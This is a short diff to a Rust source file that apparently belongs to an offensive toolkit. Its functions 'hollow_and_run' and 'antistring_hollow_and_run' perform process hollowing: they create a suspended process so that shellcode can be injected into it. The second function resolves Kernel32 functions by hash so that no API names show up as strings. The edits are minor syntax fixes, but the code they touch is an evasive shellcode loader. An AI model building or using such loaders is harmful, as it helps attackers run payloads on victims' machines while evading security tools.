@@ -30,11 +30,10 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Use CreateProcessA to create a suspended process that will be hollowed out for the shellcode
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
-    let lp_command_line = PSTR {
-        0: CString::new(target_process)
-            .unwrap()
-            .into_raw() as *mut u8
-    };
+    let lp_command_line = PSTR(CString::new(target_process)
+        .unwrap()
+        .into_raw() as *mut u8
+    );
     let creation_result = unsafe { 
         CreateProcessA(
             PCSTR::null(),
@@ -150,11 +149,10 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
 
     // See line 54
     let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
-    let lp_command_line = PSTR {
-        0: CString::new(target_process)
-            .unwrap()
-            .into_raw() as *mut u8
-    };
+    let lp_command_line = PSTR(CString::new(target_process)
+        .unwrap()
+        .into_raw() as *mut u8
+    );
     unsafe {
         mem::transmute::<*const (), fn(PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION) -> BOOL>
         (function)(
@@ -184,7 +182,7 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
     // See line 86
     let function = rco_utils::find_function_address("Kernel32", 0x1c1cfbf71004cba8).unwrap();
     let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
-    let mut address_buffer = [0; POINTER_SIZE];
+    let mut address_buffer = [0; POINTER_SIZE as usize];
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize)>
         (function)(
